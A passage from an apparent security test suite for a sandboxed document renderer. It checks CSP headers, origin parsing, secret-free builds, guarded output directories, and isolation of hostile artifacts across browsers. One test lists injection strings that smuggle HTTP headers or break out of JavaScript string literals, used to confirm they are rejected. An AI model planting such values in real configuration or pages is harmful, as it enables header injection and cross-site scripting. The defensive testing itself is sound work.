      } catch {
        rendererVerdict = "rejected";
      }
      assert.equal(
        rendererVerdict,
        hostedVerdict,
        `origin parity for ${JSON.stringify(value)} (production=${production})`,
      );
    }

    /* `canonicalOrigin` is the function that actually gates `event.origin` at
       runtime, and the build's copy is the one that gates configuration. Both
       have to agree with the contract, or the renderer accepts a spelling the
       application would have refused -- and every origin the browser matrix uses
       is already canonical, so nothing there would ever notice. It is the
       non-production rule, because a renderer served over loopback has to accept
       a loopback origin. */
    let buildVerdict;
    try {
      buildVerdict = build.readOrigin({ ORIGIN: value }, "ORIGIN", false);
    } catch {
      buildVerdict = null;
    }
    assert.equal(
      rendererModule.canonicalOrigin(value),
      buildVerdict,
      `canonicalOrigin parity for ${JSON.stringify(value)}`,
    );
  }

  /* The one deliberate difference, asserted so it stays deliberate. The
     public-suffix rule belongs to `netlify/lib/hosted/config.mjs`, which owns the list
     through a pinned dependency and refuses to start the application when the
     two configured origins share a registrable site. The renderer build does not
     restate it, and a future edit that quietly added a weaker version of it here
     would be a second policy for trusted origins. */
  assert.throws(
    () => hosted.validateOrigin("https://app.internal", { production: true }),
    /public suffix/,
    "hosted rejects an unlisted suffix in production",
  );
  assert.equal(
    build.readOrigin({ ORIGIN: "https://app.internal" }, "ORIGIN", true),
    "https://app.internal",
    "the renderer build does not restate the public-suffix rule",
  );
}

/**
 * The deployable tree is static code and nothing else.
 *
 * Run with a credential in the environment, because the way a build leaks a
 * secret is by having had one available. The five expected files are asserted by
 * name, every byte of output is searched for the secret and for the fixture
 * content that was also in scope, and no file may be anything but the three
 * committed sources and the two generated ones.
 */
async function assertBuildOutputIsStatic(tempRoot, appOrigin, renderOrigin) {
  const build = await import(pathToFileURL(join(ROOT, "renderer/scripts/build.mjs")).href);
  const secret = `s3cr3t-${randomBytes(8).toString("hex")}`;
  const outDir = join(tempRoot, "dist-secret");
  const result = await build.buildRenderer({
    outDir,
    production: false,
    env: {
      HOSTED_APP_ORIGIN: appOrigin,
      HOSTED_RENDER_ORIGIN: renderOrigin,
      GITHUB_CLIENT_ID: "Iv1.0123456789abcdef",
      GITHUB_CLIENT_SECRET: secret,
      HOSTED_PUBLISH_ENABLED: "true",
      AWS_SECRET_ACCESS_KEY: secret,
    },
  });

  assert.deepEqual(
    result.files,
    ["_headers", "index.html", "renderer-config.js", "renderer.css", "renderer.js"],
    "the renderer build publishes exactly its five files",
  );
  for (const name of result.files) {
    const bytes = await readFile(join(outDir, name), "utf8");
    assert.ok(!bytes.includes(secret), `${name} carried an environment secret into the deploy`);
    assert.ok(!bytes.includes("Iv1.0123456789abcdef"), `${name} carried a client id into the deploy`);
    assert.ok(!bytes.includes(DOCUMENT_BYTES), `${name} carried fixture document content`);
  }
  const config = await readFile(join(outDir, "renderer-config.js"), "utf8");
  assert.match(config, /appOrigin/, "the generated config names the application origin");
  assert.ok(!/session|csrf|token|cookie/i.test(config), "the generated config names no credential");

  await rm(outDir, { recursive: true, force: true });
}

/** A build-time origin cannot forge a header line or escape a string literal. */
async function assertBuildRefusesInjection() {
  const build = await import(pathToFileURL(join(ROOT, "renderer/scripts/build.mjs")).href);
  const hostile = [
    "https://app.example\nX-Injected: 1",
    'https://app.example"',
    "https://app.example';alert(1);//",
    "https://app.example\r\nSet-Cookie: a=b",
    "javascript:alert(1)",
    "https://app.example/#\n  X-Injected: 1",
  ];
  for (const value of hostile) {
    assert.throws(
      () => build.readOrigin({ HOSTED_APP_ORIGIN: value }, "HOSTED_APP_ORIGIN", true),
      (error) => error.name === "RendererBuildError" && !error.message.includes(value),
      `a hostile origin must be refused without echoing its value: ${JSON.stringify(value)}`,
    );
    assert.throws(() => build.rendererHeaders(value), /header-safe/);
    assert.throws(() => build.configScript(value), /header-safe/);
  }
  await assert.rejects(
    build.buildRenderer({ outDir: "/nonexistent", production: true, env: {} }),
    /HOSTED_APP_ORIGIN is required/,
    "a build with no configuration fails before it writes anything",
  );
}

/**
 * The build refuses every target that would destroy the tree it is built from.
 *
 * `buildRenderer` opens with `rm -rf` on its output directory, so the argument
 * that names that directory is the most dangerous input this repository takes.
 * `--out .` and `--out ..` from `renderer/` delete the sources; `--out /` is the
 * same shape and was, until this test, waved through by a prefix comparison
 * that no absolute path can satisfy. Each of these must be refused *before*
 * anything is removed, which is what makes it safe to assert them against the
 * real working tree.
 */
async function assertBuildRefusesUnsafeTargets(tempRoot) {
  const build = await import(pathToFileURL(join(ROOT, "renderer/scripts/build.mjs")).href);
  const rendererRoot = join(ROOT, "renderer");
  const env = { HOSTED_APP_ORIGIN: "https://app.example.com", HOSTED_RENDER_ORIGIN: "https://render.example.net" };

  for (const outDir of ["/", rendererRoot, join(rendererRoot, "public"), join(rendererRoot, "scripts"), ROOT]) {
    await assert.rejects(
      build.buildRenderer({ outDir, production: true, env }),
      (error) => error.name === "RendererBuildError" && /renderer tree/.test(error.message),
      `the build accepted --out ${outDir}`,
    );
  }
  /* And the sources are all still there, which is the assertion the ones above
     exist to protect. */
  assert.deepEqual(
    (await readdir(join(rendererRoot, "public"))).sort(),
    ["index.html", "renderer.css", "renderer.js"],
    "the refused targets removed renderer sources anyway",
  );

  /* A legitimate sibling target is still accepted, so the guard above is a
     rule about containment rather than a build that refuses everything. */
  const ok = join(tempRoot, "dist-target-guard");
  const result = await build.buildRenderer({ outDir: ok, production: true, env });
  assert.equal(result.files.length, 5, "a legitimate --out was refused");
  await rm(ok, { recursive: true, force: true });
}

/**
 * A file in `public/` that the build does not declare is a build failure.
 *
 * `STATIC_FILES` is both what gets copied and what the output is checked
 * against, so the two sides drift together in silence unless something holds
 * the list equal to the directory. Proving that needs a `public/` with an
 * undeclared file in it, so the whole renderer tree is copied and the copy's
 * own `build.mjs` -- which resolves its root from its own location -- is the
 * one that runs. Nothing is planted in the working tree.
 */
async function assertBuildRefusesUndeclaredPublicFile(tempRoot) {
  const copy = join(tempRoot, "renderer-copy");
  await rm(copy, { recursive: true, force: true });
  await cp(join(ROOT, "renderer"), copy, { recursive: true });
  const build = await import(pathToFileURL(join(copy, "scripts", "build.mjs")).href);
  const env = { HOSTED_APP_ORIGIN: "https://app.example.com", HOSTED_RENDER_ORIGIN: "https://render.example.net" };
  const outDir = join(tempRoot, "dist-undeclared");

  /* The copy builds, so a failure below is about the planted file and not
     about the copy. */
  const before = await build.buildRenderer({ outDir, production: true, env });
  assert.equal(before.files.length, 5, "the copied renderer tree does not build");

  await writeFile(join(copy, "public", "print.css"), "@media print { body { color: #000 } }\n", "utf8");
  await assert.rejects(
    build.buildRenderer({ outDir, production: true, env }),
    (error) => error.name === "RendererBuildError" && /print\.css/.test(error.message),
    "an undeclared file in public/ was published without being declared",
  );

  await rm(copy, { recursive: true, force: true });
  await rm(outDir, { recursive: true, force: true });
}

/**
 * `renderer/netlify.toml` says it declares no functions, no edge functions, no
 * headers and no environment values. Until this ran, all four were prose.
 *
 * AHU-011 owns the deployment configuration and will inherit this file; what it
 * should inherit is a guard rather than a promise, so that adding a function to
 * the one origin that renders arbitrary HTML, or a second header authority that
 * disagrees with the generated `_headers`, fails here first.
 */
async function assertRendererDeploymentConfig() {
  const toml = await readFile(join(ROOT, "renderer", "netlify.toml"), "utf8");
  /* Comments carry the words this checks for, and a rule that a comment can
     satisfy is not a rule. */
  const config = toml
    .split("\n")
    .filter((line) => !line.trimStart().startsWith("#"))
    .join("\n");

  for (const [pattern, why] of [
    [/^\s*\[functions[.\]]/m, "declares a [functions] block; this origin runs no server code"],
    [/^\s*\[\[edge_functions\]\]/m, "declares an edge function; the legacy identity gate belongs to the root deploy"],
    [/^\s*\[\[headers\]\]/m, "declares headers; the build owns them, and two authorities can disagree"],
    [/^\s*\[context[.\]]/m, "declares a deploy context; the renderer is configured one way or not at all"],
    [/x-frame-options/i, "names X-Frame-Options; SAMEORIGIN would forbid the framing this design requires"],
  ]) {
    assert.ok(!pattern.test(config), `renderer/netlify.toml ${why}`);
  }

  const environment = /\[build\.environment\]([\s\S]*?)(?=\n\[|$)/.exec(config);
  const assigned = [...(environment ? environment[1] : "").matchAll(/^\s*([A-Za-z0-9_]+)\s*=/gm)]
    .map((match) => match[1]);
  assert.deepEqual(
    assigned,
    ["NODE_VERSION"],
    "renderer/netlify.toml sets an environment value other than the Node version",
  );
  assert.match(config, /^\s*publish\s*=\s*"dist"$/m, "renderer/netlify.toml does not publish dist");
  assert.match(
    config,
    /^\s*command\s*=\s*"node scripts\/build\.mjs"$/m,
    "renderer/netlify.toml does not run the renderer build",
  );

  /* No lockfile and no manifest: the build imports `node:` builtins only, and a
     dependency here would be a dependency on the origin that frames hostile
     HTML. */
  for (const name of ["package.json", "package-lock.json", "node_modules"]) {
    assert.ok(!existsSync(join(ROOT, "renderer", name)), `renderer/${name} exists; the renderer takes no dependencies`);
  }
}

/* ------------------------------------------------------------------ *
 * The browser matrix.
 * ------------------------------------------------------------------ */

const ARTIFACT_URL = "about:srcdoc";

async function waitFor(check, message, { timeout = 10_000, interval = 50 } = {}) {
  const deadline = Date.now() + timeout;
  let last;
  for (;;) {
    try {
      last = await check();
      if (last) return last;
    } catch (error) {
      last = error.message;
    }
    if (Date.now() > deadline) throw new Error(`${message} (last: ${JSON.stringify(last)})`);
    await new Promise((r) => setTimeout(r, interval));
  }
}

function rendererFrameOf(page, renderOrigin) {
  return page.frames().find((frame) => frame.url().startsWith(renderOrigin));
}

function artifactFrameOf(page) {
  return page.frames().find((frame) => frame.url() === ARTIFACT_URL);
}

async function openViewer(context, appOrigin, renderOrigin, search) {
  const page = await context.newPage();
  await page.goto(`${appOrigin}/viewer${search}`);
  const renderer = await waitFor(
    () => rendererFrameOf(page, renderOrigin),
    "the renderer frame never appeared",
  );
  return { page, renderer };
}

async function rendererState(renderer) {
  return renderer.evaluate(() => ({
    state: document.documentElement.getAttribute("data-archon-state"),
    rejections: (document.documentElement.getAttribute("data-archon-rejections") || "")
      .split(" ")
      .filter(Boolean),
    refusals: Number(document.documentElement.getAttribute("data-archon-refusals") || "0"),
    status: (document.querySelector("[data-archon-status]") || {}).textContent || "",
    frames: document.querySelectorAll("iframe.artifact-frame").length,
  }));
}

/**
 * Every case this matrix must run, in order.
 *
 * The transcript is the only thing CI reads, and a transcript that says nothing
 * but "PASS" is compatible with a matrix that ran nothing: an early `return` at
 * the top of `runMatrix`, a `try {} catch {}` around its body, or an
 * engine-conditional skip all still launch both browsers, still fill in both
 * version strings and still print the same line. So each case records its own
 * name as it completes and the list is held equal to this constant -- a skipped
 * case is a failed run, and the count reaches the transcript where a reader can
 * see it.
 */
const MATRIX_CASES = Object.freeze([
  "served-response-policy",
  "standalone",
  "hostile-framer",
  "readiness-target-origin",
  "happy-path",
  "hostile-payload",
  "fragment-links",
  "self-navigation",
  "inner-policy-alone",
  "forged-readiness",
  "forged-render",
  "malformed-messages",
  "renderer-unavailable",
  "renderer-url-parameters",
]);

EXPECTED_CASES = MATRIX_CASES.length;

async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin, state, headers }) {
  const completed = [];
  const policies = new Map();
  const withContext = async (name, run) => {
    const context = await browser.newContext();
    try {
      const result = await run(context);
      completed.push(name);
      return result;
    } finally {
      await context.close();
    }
  };
  const named = (name) => `[${engine}] ${name}`;

  /* ---- the response the renderer actually serves ---- */

  await withContext("served-response-policy", async (context) => {
    const page = await context.newPage();
    const response = await page.goto(`${renderOrigin}/`);
    const served = response.headers();
    const csp = served["content-security-policy"];
    policies.set("renderer response", csp);

    /* Replaying `_headers` and then asserting the response equals `_headers`
       would be `assert.equal(x, x)`. The directives below are stated here,
       independently of the build, so a policy the build loosened fails even
       though the server faithfully replayed it. */
    for (const directive of [
      "default-src 'none'",
      "connect-src 'none'",
      "form-action 'none'",
      "object-src 'none'",
      "base-uri 'none'",
      "media-src data: blob:",
      "img-src data: blob:",
      `frame-ancestors ${appOrigin}`,
    ]) {
      assert.ok(csp.includes(directive), named(`the response policy carries ${directive}`));
    }
    assert.ok(!/unsafe-eval/.test(csp), named("the response policy allows no eval"));
    assert.ok(
      !/(script|img|connect|frame|object|media|font|style)-src[^;]*\bhttps?:(?!\/\/)/.test(csp),
      named("the response policy names no remote scheme"),
    );
    assert.match(
      csp,
      new RegExp(`frame-ancestors ${appOrigin.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`),
      named("frame-ancestors names exactly the application origin and nothing after it"),
    );
    assert.equal(served["x-frame-options"], undefined, named("no inherited X-Frame-Options"));
    assert.equal(served["x-content-type-options"], "nosniff", named("nosniff is served"));
    assert.equal(served["referrer-policy"], "no-referrer", named("no referrer is served"));
    assert.equal(
      served["cross-origin-resource-policy"],
      "cross-origin",
      named("the renderer stays embeddable under a require-corp application"),
    );
    for (const feature of ["camera", "microphone", "geolocation", "clipboard-read", "clipboard-write"]) {
      assert.ok(
        served["permissions-policy"].includes(`${feature}=()`),
        named(`the permissions policy denies ${feature}`),
      );
    }

    /* The replay itself still has to be faithful, or every assertion above is
       about a header the deploy will not send. */
    for (const [name, value] of headers) {
      assert.equal(served[name.toLowerCase()], value, named(`response header ${name} was replayed`));
    }
  });

  /* ---- standalone: inert, explanatory, and never a sign-in prompt ---- */

  await withContext("standalone", async (context) => {
    const page = await context.newPage();
    await page.goto(`${renderOrigin}/`);
    const standalone = await rendererState(page.mainFrame());
    assert.equal(standalone.state, "standalone", named("a directly opened renderer is standalone"));
    assert.equal(standalone.frames, 0, named("a directly opened renderer frames nothing"));
    const text = await page.evaluate(() => document.body.innerText);
    assert.match(text, /nothing to show/i, named("the standalone page explains itself"));
    /* "Never a sign-in prompt" is a claim about affordances rather than about
       vocabulary: the page is allowed to say that it does not sign anyone in,
       and it says exactly that. What it may not do is offer a way to try. So the
       assertion is structural -- no control of any kind -- plus a check that no
       provider or credential is being solicited in prose. */
    assert.equal(
      await page.evaluate(
        () => document.querySelectorAll("form, input, button, select, textarea, a[href]").length,
      ),
      0,
      named("the standalone page has no form, field, button or link"),
    );
    assert.ok(
      !/continue with github|sign in to|log in to|password|authorize/i.test(text),
      named("the standalone page solicits no credential"),
    );
  });

  /* ---- a hostile site may not frame the renderer at all ---- */

  await withContext("hostile-framer", async (context) => {
    /* The probe's own failure mode must not be a pass. `mounted` defaults to a
       value the assertion accepts, so the same code is first run against a
       framer that IS allowed -- the account origin -- and required to observe
       `true` there. Without that positive control, a renamed attribute or a
       detached frame would turn this case green while a hostile site framed the
       renderer freely. */
    const observeRoot = async (page) => {
      const framed = page.frames().find((frame) => frame !== page.mainFrame());
      if (!framed) return "no-frame";
      try {
        return await framed.evaluate(
          () => document.querySelector("[data-archon-artifact-root]") !== null,
        );
      } catch {
        return "unreachable";
      }
    };

    const allowed = await context.newPage();
    await allowed.goto(`${appOrigin}/viewer?artifact=interactive&mode=manual`);
    const allowedSaw = await waitFor(
      async () => (await observeRoot(allowed)) === true,
      named("the probe cannot observe a renderer the application framed"),
    );
    assert.ok(allowedSaw, named("the framing probe observes an allowed framer"));
    await allowed.close();

    /* `frame-ancestors` is enforced on the response, so the request always
       reaches the renderer server. Waiting for that request is positive
       evidence the load was attempted and refused, rather than a fixed sleep
       that a slow machine turns into a vacuous pass. */
    const rendererBefore = state.renderer.requests.length;
    const evilBefore = state.evil.requests.length;
    const page = await context.newPage();
    await page.goto(`${evilOrigin}/frame.html`);
    await waitFor(
      () => state.renderer.requests.length > rendererBefore,
      named("the hostile framer never even requested the renderer"),
    );
    await new Promise((r) => setTimeout(r, 500));
    const mounted = await observeRoot(page);
    assert.notEqual(mounted, true, named("frame-ancestors refused a hostile framer"));
    assert.ok(state.evil.requests.length > evilBefore, named("the adversary origin is reachable at all"));
  });

  /* ---- readiness is addressed, not broadcast ---- */

  await withContext("readiness-target-origin", async (context) => {
    /* `frame-ancestors` normally stops this page from framing the renderer, and
       that is exactly why it hides the readiness `targetOrigin`: with nobody
       able to frame it, a `"*"` broadcast has no audience and no case fails.
       Here the framing rule alone is removed, so a mounted renderer sits inside
       an adversary parent and the exact target origin is the only remaining
       guard. The parent must hear nothing. */
    const page = await context.newPage();
    await page.goto(`${evilOrigin}/listen.html`);
    const stolen = await waitFor(
      () => rendererFrameOf(page, renderOrigin),
      named("the renderer never loaded for the open-framing fixture"),
    );

    /* The positive control: the renderer really did mount and really did post
       its readiness message. Without this the assertion below would also pass
       for a renderer that never ran. */
    await waitFor(
      async () => (await rendererState(stolen)).state === "waiting",
      named("the renderer never mounted inside the adversary frame"),
    );
    await new Promise((r) => setTimeout(r, 500));

    const received = await page.evaluate(() => window.__received.map((entry) => ({
      origin: entry.origin,
      type: entry.data && entry.data.type,
    })));
    assert.deepEqual(
      received.filter((entry) => entry.type === "archon:ready"),
      [],
      named("readiness was broadcast to a parent that is not the configured origin"),
    );
    assert.deepEqual(received, [], named("the adversary parent received a message at all"));
  });

  /* ---- the happy path: a real inline control, and a real DOM change ---- */

  await withContext("happy-path", async (context) => {
    const { page, renderer } = await openViewer(context, appOrigin, renderOrigin, "?artifact=interactive");
    await waitFor(
      async () => (await rendererState(renderer)).state === "rendered",
      named("the artifact never rendered"),
    );

    const sandbox = await renderer.evaluate(
      () => document.querySelector("iframe.artifact-frame").getAttribute("sandbox"),
    );
    assert.equal(sandbox, "allow-scripts", named("the artifact frame is sandboxed to scripts alone"));
    const title = await renderer.evaluate(
      () => document.querySelector("iframe.artifact-frame").getAttribute("title"),
    );
    assert.equal(title, "Published document content", named("the artifact frame has a useful title"));

    const artifact = await waitFor(() => artifactFrameOf(page), named("no artifact frame"));
    policies.set(
      "artifact srcdoc",
      await artifact.evaluate(() => {
        const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
        return meta ? meta.getAttribute("content") : "(none)";
      }),
    );
    /* The artifact's stylesheet is only in effect once its document has
       finished loading. Reading the computed background before that returns
       `""` -- rarely, and only under load, which is the worst way for a test
       to fail. Wait for the document rather than for a timer. */
    const before = await waitFor(
      () => artifact.evaluate(() => {
        if (document.readyState !== "complete") return false;
        const panel = document.getElementById("panel");
        if (!panel) return false;
        const background = getComputedStyle(panel).backgroundColor;
        return background ? { text: panel.textContent, background } : false;
      }),
      named("the artifact document never finished loading"),
    );
    assert.equal(before.text, "closed", named("the artifact starts closed"));
    /* The artifact's own `style` element, not a user-agent default: `#panel`
       has no background of its own, so this value exists only if the authored
       stylesheet was applied. It is also the baseline the post-click computed
       style is measured against. */
    assert.equal(
      before.background,
      "rgb(240, 240, 240)",
      named("the artifact's own stylesheet applied"),
    );
    await artifact.click("#toggle");
    const after = await artifact.evaluate(() => {
      const panel = document.getElementById("panel");
      return { text: panel.textContent, background: getComputedStyle(panel).backgroundColor };
    });
    assert.equal(after.text, "open", named("the inline control changed the visible DOM"));
    assert.notEqual(after.background, before.background, named("the visible style actually changed"));
    assert.equal(after.background, "rgb(0, 128, 0)", named("the final computed style is the one the script set"));

    /* ---- keyboard: the frame boundary is reachable by tabbing ---- */
    await page.click("#first");
    let reached = false;
    for (let press = 0; press < 6 && !reached; press += 1) {
      await page.keyboard.press("Tab");
      reached = await renderer
        .evaluate(() => document.activeElement && document.activeElement.className === "artifact-frame")
        .catch(() => false);
    }
    assert.ok(reached, named("the artifact frame is reachable from the keyboard"));

    /* The artifact learns nothing about where it came from. This is the
       viewer's `referrerpolicy="no-referrer"` doing the work: without it
       Firefox hands `about:srcdoc` the application origin verbatim. */
    assert.equal(
      await artifact.evaluate(() => document.referrer),
      "",
      named("the artifact was told the application origin through document.referrer"),
    );

    /* ---- isolation: the artifact has authority over nothing above it ---- */
    const isolation = await artifact.evaluate(() => {
      const probe = (run) => {
        try {
          return { ok: true, value: String(run()) };
        } catch (error) {
          return { ok: false, error: String(error && error.name) };
        }
      };
      return {
        origin: String(window.origin),
        parentDocument: probe(() => typeof parent.document),
        topDocument: probe(() => typeof top.document),
        parentLocation: probe(() => parent.location.href),
        grandparentLocation: probe(() => parent.parent.location.href),
        cookie: probe(() => document.cookie),
        localStorage: probe(() => localStorage.length),
        sessionStorage: probe(() => sessionStorage.length),
        indexedDB: probe(() => String(indexedDB)),
        parentFrames: probe(() => parent.document.querySelectorAll("*").length),
      };
    });
    assert.equal(isolation.origin, "null", named("the artifact has an opaque origin"));
    assert.ok(!isolation.parentDocument.ok, named("the artifact cannot read the renderer DOM"));
    assert.ok(!isolation.topDocument.ok, named("the artifact cannot read the account DOM"));
    assert.ok(!isolation.parentLocation.ok, named("the artifact cannot read the renderer location"));
    assert.ok(!isolation.grandparentLocation.ok, named("the artifact cannot read the account location"));
    assert.ok(!isolation.parentFrames.ok, named("the artifact cannot enumerate the renderer DOM"));
    assert.ok(
      !isolation.cookie.ok || isolation.cookie.value === "",
      named("the artifact has no cookie jar"),
    );
    assert.ok(!isolation.localStorage.ok, named("the artifact has no local storage"));
    assert.ok(!isolation.sessionStorage.ok, named("the artifact has no session storage"));

    /* The account page holds a session cookie throughout, so the case above is
       about isolation rather than about an empty cookie jar everywhere. */
    const accountCookie = await page.evaluate(() => document.cookie);
    assert.match(accountCookie, /archon_session=/, named("the account page does hold a session"));

    /* ---- the renderer learns nothing about the document ---- */
    const rendererUrl = await renderer.evaluate(() => location.href);
    assert.equal(rendererUrl, `${renderOrigin}/`, named("no identifier reaches the renderer URL"));
    const rendererCookie = await renderer.evaluate(() => document.cookie);
    assert.equal(rendererCookie, "", named("the renderer origin holds no cookie"));
  });

  /* ---- the hostile payload, against the real bootstrap ---- */

  await withContext("hostile-payload", async (context) => {
    const evilBefore = state.evil.requests.length;
    const mutationsBefore = state.app.mutations.length;

    const { page, renderer } = await openViewer(context, appOrigin, renderOrigin, "?artifact=hostile");
    await waitFor(
      async () => (await rendererState(renderer)).state === "rendered",
      named("the hostile artifact never rendered"),
    );
    const artifact = await waitFor(() => artifactFrameOf(page), named("no hostile artifact frame"));
    await waitFor(
      () => artifact.evaluate(() => window.__attempts && window.__attempts.origin !== undefined),
      named("the hostile artifact never ran"),
    );
    /* Snapshotted after the viewer's own page load and artifact fetch, so the
       account-origin counters below measure the artifact and nothing else. */
    const appRequestsBefore = state.app.requests.length;
    const contentRequestsBefore = state.app.contentRequests.length;
    await new Promise((r) => setTimeout(r, 1500));

    const observed = await artifact.evaluate(() => ({
      attempts: window.__attempts,
      fetches: window.__fetches,
      evilScriptRan: window.__evilScriptRan === true,
      onloadRan: window.__onloadRan === true,
      baseURI: document.baseURI,
      hasBaseElement: document.querySelector("base") !== null,
      nestedFrames: window.frames.length,
      nestedBlank: (function () {
        var element = document.getElementById("nested-blank");
        if (!element) return { element: false, origin: "no-element", top: "no-element" };
        try {
          var child = element.contentWindow;
          return { element: true, origin: String(child.origin), top: (function () {
            try { return typeof child.top.document; } catch (error) { return "denied"; }
          })() };
        } catch (error) {
          /* An engine that gives the nested frame its own opaque origin denies
             this read outright, which is stricter than sharing one. */
          return { element: true, origin: "inaccessible", top: "denied" };
        }
      })(),
      panel: document.getElementById("panel").textContent,
      stillHere: document.getElementById("heading") !== null,
      literal: document.querySelector("p").textContent,
    }));

    /* The artifact is still an artifact: its own inline handlers work, and the
       literal closing sequences in its prose are prose. */
    assert.ok(observed.stillHere, named("the hostile artifact still rendered"));
    assert.ok(observed.onloadRan, named("an inline event handler in the artifact still runs"));
    await artifact.click("#toggle");
    assert.equal(
      await artifact.evaluate(() => document.getElementById("panel").textContent),
      "open",
      named("an inline onclick handler in the artifact still runs"),
    );
    assert.match(observed.literal, /<\/script> <\/body> <\/html> <\/iframe>/, named("closing sequences stayed text"));

    /* And it has gained nothing. */
    assert.ok(observed.hasBaseElement, named("the hostile base element is present in the DOM"));
    assert.ok(
      !observed.baseURI.startsWith(evilOrigin),
      named("base-uri denied the hostile base element"),
    );
    /* A nested frame is not itself an escape. `about:blank` inherits the
       artifact's opaque origin and its policy, so a child of the artifact is
       exactly as powerless as the artifact -- which is what is asserted, rather
       than the frame count, because the element existing proves nothing either
       way. The frame that pointed at a real remote document is the one
       `frame-src` had to stop, and the adversary origin's request log below is
       where that is proven. */
    /* The probe has to have found its element, or the two assertions below are
       about a frame that was never there. */
    assert.ok(observed.nestedBlank.element, named("the nested-frame probe found its frame"));
    assert.ok(
      observed.nestedBlank.origin === "null" || observed.nestedBlank.origin === "inaccessible",
      named(`a nested frame is opaque or unreachable (saw ${observed.nestedBlank.origin})`),
    );
    assert.equal(observed.nestedBlank.top, "denied", named("a nested frame reaches nothing above the artifact"));
    /* The remote nested frame is judged by the adversary origin's request log
       below, not by reading its location: reading a child frame's location from
       an opaque-origin parent throws whether or not it loaded, so that assertion
       could never have failed. */

    assert.ok(!observed.evilScriptRan, named("the remote script did not run"));
    assert.ok(!observed.attempts.parentDocument.ok, named("the loosened meta policy did not restore parent access"));
    assert.ok(!observed.attempts.topDocument.ok, named("the loosened meta policy did not restore top access"));
    assert.equal(observed.attempts.origin.value, "null", named("the artifact origin is still opaque"));
    assert.ok(
      !observed.attempts.openPopup.ok || observed.attempts.openPopup.value === "null",
      named("the sandbox denied a popup"),
    );
    assert.equal(context.pages().length, 1, named("no popup window opened"));
    assert.equal(page.url(), `${appOrigin}/viewer?artifact=hostile`, named("the account page did not navigate"));

    /* `"pending"` is written before each request, so asserting only that an
       outcome does not start with `read:` would accept a request that simply
       had not settled yet -- and the slower the machine, the more of them.
       Every probe has to reach a terminal answer before any of them is judged. */
    const settled = await waitFor(
      async () => {
        const fetches = await artifact.evaluate(() => window.__fetches);
        return Object.values(fetches).every((outcome) => outcome !== "pending") ? fetches : false;
      },
      named("a request probe never settled"),
    );
    for (const [name, outcome] of Object.entries(settled)) {
      assert.ok(
        typeof outcome === "string" && !outcome.startsWith("read:"),
        named(`the ${name} request obtained no bytes (saw ${outcome})`),
      );
    }
    assert.equal(
      state.app.contentRequests.length,
      contentRequestsBefore,
      named("no document read request reached the account API at all"),
    );
    assert.equal(
      state.app.requests.length,
      appRequestsBefore,
      named("not one artifact-borne request reached the account origin"),
    );
    assert.equal(
      state.app.mutations.length,
      mutationsBefore,
      named("no mutation reached the account API"),
    );
    assert.equal(
      state.evil.requests.length,
      evilBefore,
      named("not one request reached the adversary origin"),
    );
  });

  /* ---- fragment-only links ---- */

  await withContext("fragment-links", async (context) => {
    const { page, renderer } = await openViewer(context, appOrigin, renderOrigin, "?artifact=fragments");
    await waitFor(
      async () => (await rendererState(renderer)).state === "rendered",
      named("the fragment artifact never rendered"),
    );
    const artifact = await waitFor(() => artifactFrameOf(page), named("no fragment artifact frame"));

    await artifact.click("#to-two");
    await waitFor(
      () => artifact.evaluate(() => window.scrollY > 100),
      named("a fragment link did not scroll the artifact"),
    );
    const afterFragment = await artifact.evaluate(() => ({
      url: location.href,
      href: document.getElementById("to-two").getAttribute("href"),
      authored: window.__authored.slice(),
      present: document.getElementById("section-two") !== null,
    }));
    assert.equal(afterFragment.url, ARTIFACT_URL, named("the artifact did not navigate"));
    assert.equal(afterFragment.href, "#section-two", named("the original href attribute is untouched"));
    assert.deepEqual(afterFragment.authored, ["observed"], named("the authored click listener still ran"));
    assert.ok(afterFragment.present, named("the artifact document survived the fragment click"));

    await artifact.evaluate(() => window.scrollTo(0, 0));
    await artifact.click("#to-missing");
    await new Promise((r) => setTimeout(r, 300));
    const afterMissing = await artifact.evaluate(() => ({
      url: location.href,
      scrollY: window.scrollY,
      present: document.getElementById("section-one") !== null,
    }));
    assert.equal(afterMissing.url, ARTIFACT_URL, named("a missing target did not navigate"));
    assert.equal(afterMissing.scrollY, 0, named("a missing target did not scroll"));
    assert.ok(afterMissing.present, named("a missing target left the artifact in place"));

    await artifact.click("#to-claimed");
    await new Promise((r) => setTimeout(r, 300));
    const afterClaimed = await artifact.evaluate(() => ({
      scrollY: window.scrollY,
      authored: window.__authored.slice(),
    }));
    assert.ok(
      afterClaimed.authored.includes("claimed"),
      named("the authored listener that claimed the link ran"),
    );
    assert.equal(afterClaimed.scrollY, 0, named("the prelude yielded to the authored preventDefault"));

    await artifact.click("#to-encoded");
    await waitFor(
      () => artifact.evaluate(() => window.scrollY > 100),
      named("a percent-encoded fragment did not resolve"),
    );

    /* Whatever happened above, the renderer still holds exactly one artifact and
       has not replaced it. */
    const settled = await rendererState(renderer);
    assert.equal(settled.frames, 1, named("the renderer still holds exactly one artifact frame"));
  });

  /* ---- an artifact may not replace itself with attacker-served content ---- */

  await withContext("self-navigation", async (context) => {
    const evilBefore = state.evil.requests.length;
    const { page, renderer } = await openViewer(
      context,
      appOrigin,
      renderOrigin,
      "?artifact=self-navigation",
    );
    await waitFor(
      async () => (await rendererState(renderer)).state === "rendered",
      named("the self-navigating artifact never rendered"),
    );
    /* Long enough for three navigations to have completed if any of them were
       going to. A shorter wait would make "it did not navigate" indistinguishable
       from "it has not navigated yet". */
    await new Promise((r) => setTimeout(r, 2000));

    /* The adversary's own request log is the assertion that cannot be fooled:
       whatever the frame's location reads as, a navigation that reached the
       attacker would be a line in this list. */
    assert.equal(
      state.evil.requests.length,
      evilBefore,
      named("a self-navigation attempt reached the adversary origin"),
    );

    /* What the frame becomes is engine business -- Chromium leaves a browser
       error document behind, another engine may leave the srcdoc in place or go
       blank -- and the contract does not promise a particular one. What it does
       promise is that the reader is never shown someone else's page inside the
       trusted viewer's chrome, so that is what is asserted: no frame anywhere on
       the page is at the adversary's address. An artifact can destroy its own
       view. It cannot replace it with an attacker's. */
    const frameUrls = page.frames().map((frame) => frame.url());
    assert.ok(
      frameUrls.every((url) => !url.startsWith(evilOrigin)),
      named(`no frame reached the adversary origin (saw ${JSON.stringify(frameUrls)})`),
    );
    assert.equal(
      (await rendererState(renderer)).frames,
      1,
      named("the renderer still holds exactly one artifact frame and added none"),
    );

    /* The attempt has to have actually happened, or the case above proves
       nothing. It is observed from the renderer's side, because the artifact
       document that made the attempt may no longer exist to be asked. */
    const artifact = artifactFrameOf(page);
    if (artifact) {
